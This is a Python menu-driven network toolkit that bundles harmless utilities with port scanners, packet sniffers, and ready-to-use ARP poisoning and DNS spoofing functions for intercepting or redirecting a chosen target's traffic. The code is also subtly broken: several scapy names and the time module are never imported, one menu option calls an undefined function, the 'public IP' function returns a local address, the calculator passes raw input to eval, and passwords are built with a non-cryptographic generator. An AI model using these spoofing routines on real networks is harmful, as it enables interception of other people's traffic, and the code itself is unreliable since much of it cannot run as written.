import socket
import pcapy
import http.server
import socketserver
import subprocess
import whois
import pyfiglet
import random
import string
import math
import hashlib
import base64
import qrcode
from datetime import datetime
import netifaces
from scapy.all import ARP, Ether, srp
import os
import shutil
import platform
import webbrowser

def get_public_ip():
    try:
        response = socket.gethostbyname(socket.gethostname())
        return response
    except socket.gaierror as e:
        return f'Error: {e}'

def scan_tcp_ports(target_host, ports):
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((target_host, port))
                open_ports.append(port)
        except (socket.timeout, ConnectionRefusedError):
            pass
    return open_ports

def scan_udp_ports(target_host, ports):
    open_ports = []
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(1)
                s.sendto(b'', (target_host, port))
                data, _ = s.recvfrom(1024)
                if data:
                    open_ports.append(port)
        except (socket.timeout, ConnectionRefusedError):
            pass
    return open_ports

def resolve_dns(hostname):
    try:
        ip = socket.gethostbyname(hostname)
        return ip
    except socket.gaierror as e:
        return f'Error: {e}'

def reverse_dns(ip_address):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip_address)
        return hostname
    except socket.herror as e:
        return f'Error: {e}'

def capture_packets(interface, count):
    try:
        cap = pcapy.open_live(interface, 65536, True, 0)
        for _ in range(count):
            _, packet = cap.next()
            print(packet)
    except pcapy.PcapError as e:
        return f'Error: {e}'

def start_http_server(port):
    try:
        with socketserver.TCPServer(("", port), http.server.SimpleHTTPRequestHandler) as httpd:
            print(f'Starting HTTP server on port {port}...')
            httpd.serve_forever()
    except OSError as e:
        return f'Error: {e}'

def ping(host):
    try:
        output = subprocess.check_output(["ping", "-c", "4", host], universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        return f'Error: {e}'

def traceroute(host):
    try:
        output = subprocess.check_output(["traceroute", host], universal_newlines=True)
        return output
    except subprocess.CalledProcessError as e:
        return f'Error: {e}'

def whois_lookup(domain):
    try:
        w = whois.whois(domain)
        return w
    except Exception as e:
        return f'Error: {e}'

def generate_ascii_art(text):
    try:
        ascii_art = pyfiglet.figlet_format(text)
        return ascii_art
    except pyfiglet.FigletError as e:
        return f'Error: {e}'

def generate_random_password(length=12):
    try:
        characters = string.ascii_letters + string.digits + string.punctuation
        password = ''.join(random.choice(characters) for _ in range(length))
        return password
    except Exception as e:
        return f'Error: {e}'

def basic_calculator():
    try:
        expression = input("Enter a math expression: ")
        result = eval(expression)
        return result
    except Exception as e:
        return f'Error: {e}'

def generate_qr_code(data):
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(data)
        qr.make(fit=True)
        img = qr.make_image(fill_color="black", back_color="white")
        img.save("qrcode.png")
        return "QR code generated as 'qrcode.png'"
    except Exception as e:
        return f'Error: {e}'

def get_current_datetime():
    try:
        now = datetime.now()
        current_time = now.strftime("%Y-%m-%d %H:%M:%S")
        return f'Current Date and Time: {current_time}'
    except Exception as e:
        return f'Error: {e}'

def encode_base64(data):
    try:
        encoded_data = base64.b64encode(data.encode()).decode()
        return f'Base64 Encoded: {encoded_data}'
    except Exception as e:
        return f'Error: {e}'

def decode_base64(data):
    try:
        decoded_data = base64.b64decode(data.encode()).decode()
        return f'Base64 Decoded: {decoded_data}'
    except Exception as e:
        return f'Error: {e}'

def get_random_quote():
    try:
        quotes = [
            "The only way to do great work is to love what you do. - Steve Jobs",
            "Innovation distinguishes between a leader and a follower. - Steve Jobs",
            "Your time is limited, don't waste it living someone else's life. - Steve Jobs",
            "The only limit to our realization of tomorrow will be our doubts of today. - Franklin D. Roosevelt",
            "You miss 100% of the shots you don't take. - Wayne Gretzky",
            "Success is not final, failure is not fatal: It is the courage to continue that counts. - Winston Churchill",
            "The best revenge is massive success. - Frank Sinatra",
            "The only thing standing between you and your goal is the story you keep telling yourself as to why you can't achieve it. - Jordan Belfort",
            "The road to success and the road to failure are almost exactly the same. - Colin R. Davis",
            "The successful warrior is the average man, with laser-like focus. - Bruce Lee",
        ]
        quote = random.choice(quotes)
        return f'Quote: "{quote}"'
    except Exception as e:
        return f'Error: {e}'

def port_scanner(target_host, start_port, end_port):
    open_ports = []
    for port in range(start_port, end_port + 1):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((target_host, port))
                open_ports.append(port)
        except (socket.timeout, ConnectionRefusedError):
            pass
    return open_ports

def sniff_packets(interface, count):
    try:
        packets = pcapy.open_live(interface, 65536, True, 0).readpkts(count)
        for packet in packets:
            print(packet)
    except pcapy.PcapError as e:
        return f'Error: {e}'

def display_arp_cache():
    try:
        arp_cache = netifaces.gateways()['default'][netifaces.AF_INET][0]
        arp_result = subprocess.check_output(["arp", "-a", arp_cache], universal_newlines=True)
        return arp_result
    except subprocess.CalledProcessError as e:
        return f'Error: {e}'

def arp_poison(target_ip, gateway_ip, interface, count):
    try:
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp = ARP(psrc=gateway_ip, pdst=target_ip, op="is-at")
        packet = ether/arp
        for _ in range(count):
            sendp(packet, iface=interface)
            time.sleep(1)
    except Exception as e:
        return f'Error: {e}'

def dns_spoof(target_ip, target_domain, spoof_ip, interface, count):
    try:
        ether = Ether()
        ip = IP(src=spoof_ip, dst=target_ip)
        udp = UDP(dport=53)
        dns = DNS(
            id=42,
            qd=DNSQR(qname=target_domain),
            an=DNSRR(rrname=target_domain, rdata=spoof_ip)
        )
        packet = ether/ip/udp/dns
        for _ in range(count):
            sendp(packet, iface=interface)
            time.sleep(1)
    except Exception as e:
        return f'Error: {e}'

def clear_screen():
    try:
        if platform.system() == 'Windows':
            os.system('cls')
        else:
            os.system('clear')
        return "Screen cleared."
    except Exception as e:
        return f'Error: {e}'

def create_directory(directory_name):
    try:
        os.makedirs(directory_name, exist_ok=True)
        return f'Directory "{directory_name}" created.'
    except Exception as e:
        return f'Error: {e}'

def delete_directory(directory_name):
    try:
        shutil.rmtree(directory_name)
        return f'Directory "{directory_name}" deleted.'
    except Exception as e:
        return f'Error: {e}'

def open_webpage(url):
    try:
        webbrowser.open(url)
        return f'Opening webpage: {url}'
    except Exception as e:
        return f'Error: {e}'

if __name__ == '__main__':
    print("1. Fetch Public IP Address")
    print("2. Scan TCP Ports")
    print("3. Scan UDP Ports")
    print("4. Resolve DNS")
    print("5. Reverse DNS Lookup")
    print("6. Capture Packets")
    print("7. Start HTTP Server")
    print("8. Ping")
    print("9. Traceroute")
    print("10. Whois Lookup")
    print("11. Generate ASCII Art")
    print("12. Generate Random Password")
    print("13. Get Random Quote")
    print("14. Basic Calculator")
    print("15. Generate QR Code")
    print("16. Get Current Date and Time")
    print("17. Encode Base64")
    print("18. Decode Base64")
    print("19. Port Scanner")
    print("20. Sniff Packets")
    print("21. Display ARP Cache")
    print("22. ARP Poisoning")
    print("23. DNS Spoofing")
    print("24. Clear Screen")
    print("25. Create Directory")
    print("26. Delete Directory")
    print("27. Open Webpage")
    choice = input("Select an option (1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20/21/22/23/24/25/26/27): ")

    if choice == '1':
        public_ip = get_public_ip()
        print(public_ip)
    elif choice == '2' or choice == '3':
        target_host = input("Enter the target host (e.g., example.com): ")
        port_range = input("Enter the port range to scan (e.g., 80-100): ")

        try:
            start_port, end_port = map(int, port_range.split('-'))
            ports_to_scan = range(start_port, end_port + 1)

            if choice == '2':
                open_ports = scan_tcp_ports(target_host, ports_to_scan)
                protocol = "TCP"
            else:
                open_ports = scan_udp_ports(target_host, ports_to_scan)
                protocol = "UDP"

            if open_ports:
                print(f'Open {protocol} ports on {target_host}: {open_ports}')
            else:
                print(f'No open {protocol} ports found on {target_host}')
        except ValueError:
            print('Invalid port range format. Use format like "80-100"')
    elif choice == '4':
        hostname = input("Enter the hostname to resolve: ")
        resolved_ip = resolve_dns(hostname)
        print(resolved_ip)
    elif choice == '5':
        ip_address = input("Enter the IP address for reverse DNS lookup: ")
        hostname = reverse_dns(ip_address)
        print(hostname)
    elif choice == '6':
        interface = input("Enter the network interface to capture packets (e.g., eth0): ")
        count = int(input("Enter the number of packets to capture: "))
        capture_packets(interface, count)
    elif choice == '7':
        port = int(input("Enter the HTTP server port: "))
        start_http_server(port)
    elif choice == '8':
        host = input("Enter the host to ping: ")
        ping_result = ping(host)
        print(ping_result)
    elif choice == '9':
        host = input("Enter the host to traceroute: ")
        traceroute_result = traceroute(host)
        print(traceroute_result)
    elif choice == '10':
        domain = input("Enter the domain name for Whois lookup: ")
        whois_info = whois_lookup(domain)
        print(whois_info)
    elif choice == '11':
        text = input("Enter text for ASCII art: ")
        ascii_art = generate_ascii_art(text)
        print(ascii_art)
    elif choice == '12':
        password_length = int(input("Enter the password length: "))
        random_password = generate_random_password(password_length)
        print(f'Generated Password: {random_password}')
    elif choice == '13':
        fortune_cookie = get_fortune_cookie()
        print(f'Fortune Cookie: {fortune_cookie}')
    elif choice == '14':
        result = basic_calculator()
        print(f'Result: {result}')
    elif choice == '15':
        data = input("Enter data for QR code generation: ")
        qr_code_result = generate_qr_code(data)
        print(qr_code_result)
    elif choice == '16':
        current_datetime = get_current_datetime()
        print(current_datetime)
    elif choice == '17':
        data = input("Enter text for Base64 encoding: ")
        encoded_data = encode_base64(data)
        print(encoded_data)
    elif choice == '18':
        data = input("Enter Base64 encoded text for decoding: ")
        decoded_data = decode_base64(data)
        print(decoded_data)
    elif choice == '19':
        target_host = input("Enter the target host for port scanning (e.g., example.com): ")
        start_port = int(input("Enter the start port: "))
        end_port = int(input("Enter the end port: "))
        open_ports = port_scanner(target_host, start_port, end_port)
        if open_ports:
            print(f'Open ports on {target_host}: {open_ports}')
        else:
            print(f'No open ports found on {target_host}')
    elif choice == '20':
        interface = input("Enter the network interface to sniff packets (e.g., eth0): ")
        count = int(input("Enter the number of packets to sniff: "))
        sniff_packets(interface, count)
    elif choice == '21':
        arp_cache = display_arp_cache()
        print(arp_cache)
    elif choice == '22':
        target_ip = input("Enter the target IP for ARP poisoning: ")
        gateway_ip = input("Enter the gateway IP: ")
        interface = input("Enter the network interface: ")
        count = int(input("Enter the number of ARP poisoning packets to send: "))
        arp_poison(target_ip, gateway_ip, interface, count)
    elif choice == '23':
        target_ip = input("Enter the target IP for DNS spoofing: ")
        target_domain = input("Enter the target domain to spoof: ")
        spoof_ip = input("Enter the IP to spoof: ")
        interface = input("Enter the network interface: ")
        count = int(input("Enter the number of DNS spoofing packets to send: "))
        dns_spoof(target_ip, target_domain, spoof_ip, interface, count)
    elif choice == '24':
        clear_screen()
    elif choice == '25':
        directory_name = input("Enter the directory name to create: ")
        directory_created = create_directory(directory_name)
        print(directory_created)
    elif choice == '26':
        directory_name = input("Enter the directory name to delete: ")
        directory_deleted = delete_directory(directory_name)
        print(directory_deleted)
    elif choice == '27':
        url = input("Enter the URL to open in a web browser: ")
        webpage_opened = open_webpage(url)
        print(webpage_opened)
    else:
        print('Invalid choice. Please select a valid option (1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20/21/22/23/24/25/26/27).')
